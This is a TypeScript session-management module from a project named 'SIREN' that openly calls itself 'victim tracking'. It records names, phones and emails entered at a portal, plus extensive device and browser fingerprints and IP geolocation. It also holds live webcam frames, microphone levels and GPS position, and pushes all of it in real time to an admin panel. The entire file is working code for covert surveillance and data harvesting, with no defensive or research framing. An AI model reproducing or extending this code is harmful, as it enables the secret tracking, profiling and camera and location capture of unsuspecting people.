/**
 * PROJECT SIREN - Session Management
 * 
 * Production-grade victim tracking with comprehensive fingerprinting.
 * Stores device, browser, network, and behavioral data for each session.
 */

import { Fingerprint } from './fingerprint';

// ===================================
// TYPES
// ===================================

export interface IPGeolocation {
    ip: string;
    country: string;
    countryCode: string;
    region: string;
    regionName: string;
    city: string;
    zip: string;
    lat: number;
    lon: number;
    timezone: string;
    isp: string;
    org: string;
    as: string;
    mobile: boolean;
    proxy: boolean;
    hosting: boolean;
}

export interface VictimProfile {
    // === IDENTITY ===
    id: number;
    sessionId: string;
    timestamp: string;

    // === PORTAL DATA ===
    name?: string;
    phone?: string;
    email?: string;

    // === DEVICE ===
    device: {
        type: string;
        os: string;
        osVersion: string;
        vendor: string;
        model: string;
        isMobile: boolean;
        isTablet: boolean;
    };

    // === BROWSER ===
    browser: {
        name: string;
        version: string;
        engine: string;
        userAgent: string;
        language: string;
        languages: string[];
        cookiesEnabled: boolean;
        doNotTrack: boolean;
        platform: string;
    };

    // === DISPLAY ===
    display: {
        screenWidth: number;
        screenHeight: number;
        viewportWidth: number;
        viewportHeight: number;
        colorDepth: number;
        pixelRatio: number;
        orientation: string;
        touchSupport: boolean;
        maxTouchPoints: number;
    };

    // === NETWORK ===
    network: {
        connectionType: string;
        effectiveType: string;
        downlink: number;
        rtt: number;
        onLine: boolean;
    };

    // === IP GEOLOCATION ===
    ipGeo?: IPGeolocation;

    // === LOCALE ===
    locale: {
        timezone: string;
        timezoneOffset: number;
        language: string;
    };

    // === CAPABILITIES ===
    capabilities: {
        webGL: boolean;
        webGLVendor: string;
        webGLRenderer: string;
        canvas: boolean;
        localStorage: boolean;
        sessionStorage: boolean;
        indexedDB: boolean;
        serviceWorker: boolean;
        webRTC: boolean;
        geolocation: boolean;
        notifications: boolean;
    };

    // === HARDWARE ===
    hardware: {
        cpuCores: number;
        deviceMemory: number;
        maxTouchPoints: number;
    };
}

// Legacy Victim type for backward compatibility
export interface Victim {
    id: number;
    userAgent: string;
    ip: string;
    timestamp: string;
    device: 'iOS' | 'Android' | 'Desktop' | 'Unknown';
    browser: string;
    name?: string;
    phone?: string;
    email?: string;
}

export interface SessionStats {
    count: number;
    victims: Victim[];
    profiles: VictimProfile[];
    deviceBreakdown: {
        iOS: number;
        Android: number;
        Desktop: number;
        Tablet: number;
        Unknown: number;
    };
    currentVictim?: VictimProfile;
    currentMedia?: MediaCapture;
}

// Media capture data from live webcam streaming
export interface MediaCapture {
    frame?: string; // Base64 JPEG of current live frame
    audioLevel?: number; // 0-100 microphone level
    location?: {
        latitude: number;
        longitude: number;
        accuracy: number;
    };
    permissions: {
        camera: boolean;
        microphone: boolean;
        geolocation: boolean;
    };
    capturedAt: string;
    isLive?: boolean; // Indicates live stream vs static capture
}

// ===================================
// IN-MEMORY STORAGE
// Uses globalThis to persist across Next.js API route instances
// ===================================

// Declare global type for sessions
declare global {
    // eslint-disable-next-line no-var
    var sirenSessions: SessionStats | undefined;
}

// Use globalThis to persist sessions across hot reloads
const defaultSessions: SessionStats = {
    count: 0,
    victims: [],
    profiles: [],
    deviceBreakdown: {
        iOS: 0,
        Android: 0,
        Desktop: 0,
        Tablet: 0,
        Unknown: 0,
    },
    currentVictim: undefined,
    currentMedia: undefined,
};

const sessions: SessionStats = globalThis.sirenSessions || defaultSessions;
globalThis.sirenSessions = sessions;

// ===================================
// UTILITY FUNCTIONS
// ===================================

function generateSessionId(): string {
    return `siren_${Date.now().toString(36)}_${Math.random().toString(36).substr(2, 9)}`;
}

export function parseDevice(userAgent: string): Victim['device'] {
    const ua = userAgent.toLowerCase();
    if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ipod')) return 'iOS';
    if (ua.includes('android')) return 'Android';
    if (ua.includes('windows') || ua.includes('macintosh') || ua.includes('linux')) {
        if (!ua.includes('mobile')) return 'Desktop';
    }
    return 'Unknown';
}

export function parseBrowser(userAgent: string): string {
    const ua = userAgent.toLowerCase();
    if (ua.includes('chrome') && !ua.includes('edg')) return 'Chrome';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('edg')) return 'Edge';
    if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
    return 'Other';
}

// ===================================
// IP GEOLOCATION (Free API)
// ===================================

export async function fetchIPGeolocation(ip: string): Promise<IPGeolocation | undefined> {
    // Skip for localhost/private IPs
    if (!ip || ip === 'Unknown' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
        return undefined;
    }

    try {
        // Using ip-api.com - free, no key, 45 req/min limit
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`, {
            signal: AbortSignal.timeout(3000),
        });

        if (!response.ok) return undefined;

        const data = await response.json();
        if (data.status !== 'success') return undefined;

        return {
            ip: data.query || ip,
            country: data.country || 'Unknown',
            countryCode: data.countryCode || '',
            region: data.region || '',
            regionName: data.regionName || '',
            city: data.city || '',
            zip: data.zip || '',
            lat: data.lat || 0,
            lon: data.lon || 0,
            timezone: data.timezone || '',
            isp: data.isp || '',
            org: data.org || '',
            as: data.as || '',
            mobile: data.mobile || false,
            proxy: data.proxy || false,
            hosting: data.hosting || false,
        };
    } catch {
        return undefined;
    }
}

// ===================================
// ADD VICTIM (Extended)
// ===================================

export async function addVictimWithProfile(
    fingerprint: Fingerprint,
    ip: string,
    formData?: { name?: string; phone?: string; email?: string }
): Promise<VictimProfile> {
    const sessionId = generateSessionId();
    const timestamp = new Date().toISOString();

    // Fetch IP geolocation
    const ipGeo = await fetchIPGeolocation(ip);

    const profile: VictimProfile = {
        id: ++sessions.count,
        sessionId,
        timestamp,
        name: formData?.name || undefined,
        phone: formData?.phone || undefined,
        email: formData?.email || undefined,
        device: {
            type: fingerprint.device.type,
            os: fingerprint.device.os,
            osVersion: fingerprint.device.osVersion,
            vendor: fingerprint.device.vendor,
            model: fingerprint.device.model,
            isMobile: fingerprint.device.isMobile,
            isTablet: fingerprint.device.isTablet,
        },
        browser: {
            name: fingerprint.browser.name,
            version: fingerprint.browser.version,
            engine: fingerprint.browser.engine,
            userAgent: fingerprint.browser.userAgent,
            language: fingerprint.browser.language,
            languages: fingerprint.browser.languages,
            cookiesEnabled: fingerprint.browser.cookiesEnabled,
            doNotTrack: fingerprint.browser.doNotTrack,
            platform: fingerprint.browser.platform,
        },
        display: {
            screenWidth: fingerprint.display.screenWidth,
            screenHeight: fingerprint.display.screenHeight,
            viewportWidth: fingerprint.display.viewportWidth,
            viewportHeight: fingerprint.display.viewportHeight,
            colorDepth: fingerprint.display.colorDepth,
            pixelRatio: fingerprint.display.pixelRatio,
            orientation: fingerprint.display.orientation,
            touchSupport: fingerprint.display.touchSupport,
            maxTouchPoints: fingerprint.display.maxTouchPoints,
        },
        network: {
            connectionType: fingerprint.network.connectionType,
            effectiveType: fingerprint.network.effectiveType,
            downlink: fingerprint.network.downlink,
            rtt: fingerprint.network.rtt,
            onLine: fingerprint.network.onLine,
        },
        ipGeo,
        locale: {
            timezone: fingerprint.locale.timezone,
            timezoneOffset: fingerprint.locale.timezoneOffset,
            language: fingerprint.locale.language,
        },
        capabilities: {
            webGL: fingerprint.capabilities.webGL,
            webGLVendor: fingerprint.capabilities.webGLVendor,
            webGLRenderer: fingerprint.capabilities.webGLRenderer,
            canvas: fingerprint.capabilities.canvas,
            localStorage: fingerprint.capabilities.localStorage,
            sessionStorage: fingerprint.capabilities.sessionStorage,
            indexedDB: fingerprint.capabilities.indexedDB,
            serviceWorker: fingerprint.capabilities.serviceWorker,
            webRTC: fingerprint.capabilities.webRTC,
            geolocation: fingerprint.capabilities.geolocation,
            notifications: fingerprint.capabilities.notifications,
        },
        hardware: {
            cpuCores: fingerprint.hardware.cpuCores,
            deviceMemory: fingerprint.hardware.deviceMemory,
            maxTouchPoints: fingerprint.hardware.maxTouchPoints,
        },
    };

    sessions.profiles.push(profile);
    sessions.currentVictim = profile;

    // Update device breakdown
    const deviceType = profile.device.type as keyof typeof sessions.deviceBreakdown;
    if (deviceType in sessions.deviceBreakdown) {
        sessions.deviceBreakdown[deviceType]++;
    } else {
        sessions.deviceBreakdown.Unknown++;
    }

    // Keep only last 100 profiles
    if (sessions.profiles.length > 100) {
        sessions.profiles.shift();
    }

    // Create legacy victim for backward compatibility
    const legacyVictim: Victim = {
        id: profile.id,
        userAgent: profile.browser.userAgent,
        ip: ipGeo?.ip || ip,
        timestamp: profile.timestamp,
        device: parseDevice(profile.browser.userAgent),
        browser: profile.browser.name,
        name: profile.name,
        phone: profile.phone,
        email: profile.email,
    };

    sessions.victims.push(legacyVictim);
    if (sessions.victims.length > 100) {
        sessions.victims.shift();
    }

    return profile;
}

// Legacy add victim (backward compatibility)
export function addVictim(
    userAgent: string,
    ip: string,
    formData?: { name?: string; phone?: string; email?: string }
): Victim {
    const device = parseDevice(userAgent);
    const browser = parseBrowser(userAgent);

    const victim: Victim = {
        id: ++sessions.count,
        userAgent,
        ip: ip || 'Unknown',
        timestamp: new Date().toISOString(),
        device,
        browser,
        name: formData?.name || undefined,
        phone: formData?.phone || undefined,
        email: formData?.email || undefined,
    };

    sessions.victims.push(victim);
    sessions.deviceBreakdown[device]++;

    if (sessions.victims.length > 100) {
        const removed = sessions.victims.shift();
        if (removed) sessions.deviceBreakdown[removed.device]--;
    }

    // Create a partial profile for currentVictim display
    // This ensures the admin panel updates even if tracking falls back to legacy
    const partialProfile: VictimProfile = {
        ...victim,
        sessionId: generateSessionId(),
        device: {
            type: device,
            os: 'Unknown',
            osVersion: '',
            vendor: 'Unknown',
            model: '',
            isMobile: device === 'Android' || device === 'iOS',
            isTablet: false, // Legacy detection doesn't distinguish tablet
        },
        browser: {
            name: browser,
            version: '',
            engine: '',
            userAgent: userAgent,
            language: 'en-US',
            languages: ['en-US'],
            cookiesEnabled: true,
            doNotTrack: false,
            platform: 'Unknown',
        },
        display: {
            screenWidth: 1920,
            screenHeight: 1080,
            viewportWidth: 1920,
            viewportHeight: 1080,
            colorDepth: 24,
            pixelRatio: 1,
            orientation: 'landscape',
            touchSupport: false,
            maxTouchPoints: 0,
        },
        network: {
            connectionType: '4g',
            effectiveType: '4g',
            downlink: 10,
            rtt: 50,
            onLine: true,
        },
        locale: {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            language: 'en-US',
        },
        capabilities: {
            webGL: true,
            webGLVendor: '',
            webGLRenderer: '',
            canvas: true,
            localStorage: true,
            sessionStorage: true,
            indexedDB: true,
            serviceWorker: false,
            webRTC: true,
            geolocation: false,
            notifications: false,
        },
        hardware: {
            cpuCores: 4,
            deviceMemory: 8,
            maxTouchPoints: 0,
        },
    };

    sessions.currentVictim = partialProfile;

    // Notify specifically for the current victim panel
    notifyCurrentVictim();

    return victim;
}

// ===================================
// GETTERS
// ===================================

export function getStats(): SessionStats {
    return { ...sessions };
}

export function getCurrentVictim(): VictimProfile | undefined {
    return sessions.currentVictim;
}

export function getAllProfiles(): VictimProfile[] {
    return [...sessions.profiles];
}

export function getRecentVictims(count: number = 10): Victim[] {
    return sessions.victims.slice(-count).reverse();
}

export function resetSessions(): void {
    sessions.count = 0;
    sessions.victims = [];
    sessions.profiles = [];
    sessions.deviceBreakdown = { iOS: 0, Android: 0, Desktop: 0, Tablet: 0, Unknown: 0 };
    sessions.currentVictim = undefined;
}

// ===================================
// SSE CLIENT MANAGEMENT
// Uses globalThis to persist across Next.js API route instances
// ===================================

// Declare global type for TypeScript
declare global {
    // eslint-disable-next-line no-var
    var sseClients: Set<ReadableStreamDefaultController> | undefined;
}

// Use globalThis to persist clients across hot reloads and API route instances
const clients: Set<ReadableStreamDefaultController> = globalThis.sseClients || new Set();
globalThis.sseClients = clients;

export function addClient(controller: ReadableStreamDefaultController): void {
    clients.add(controller);
    console.log(`[SSE] Client connected. Total clients: ${clients.size}`);
}

export function removeClient(controller: ReadableStreamDefaultController): void {
    clients.delete(controller);
    console.log(`[SSE] Client disconnected. Total clients: ${clients.size}`);
}

export function notifyClients(victim: Victim | VictimProfile): void {
    const data = JSON.stringify(victim);
    const message = `data: ${data}\n\n`;

    console.log(`[SSE] Notifying ${clients.size} clients of new victim`);

    clients.forEach((controller) => {
        try {
            controller.enqueue(new TextEncoder().encode(message));
        } catch {
            clients.delete(controller);
        }
    });
}

export function notifyCurrentVictim(): void {
    if (sessions.currentVictim) {
        const data = JSON.stringify({ type: 'current_victim', profile: sessions.currentVictim });
        const message = `data: ${data}\n\n`;

        console.log(`[SSE] Notifying ${clients.size} clients of current victim update`);

        clients.forEach((controller) => {
            try {
                controller.enqueue(new TextEncoder().encode(message));
            } catch {
                clients.delete(controller);
            }
        });
    }
}

// ===================================
// MEDIA CAPTURE MANAGEMENT
// ===================================

export function updateMedia(media: MediaCapture): void {
    sessions.currentMedia = media;
    notifyMediaUpdate();
}

export function notifyMediaUpdate(): void {
    if (sessions.currentMedia) {
        const data = JSON.stringify({ type: 'media_update', media: sessions.currentMedia });
        const message = `data: ${data}\n\n`;

        clients.forEach((controller) => {
            try {
                controller.enqueue(new TextEncoder().encode(message));
            } catch {
                clients.delete(controller);
            }
        });
    }
}

export function getCurrentMedia(): MediaCapture | undefined {
    return sessions.currentMedia;
}

export function clearMedia(): void {
    sessions.currentMedia = undefined;
}
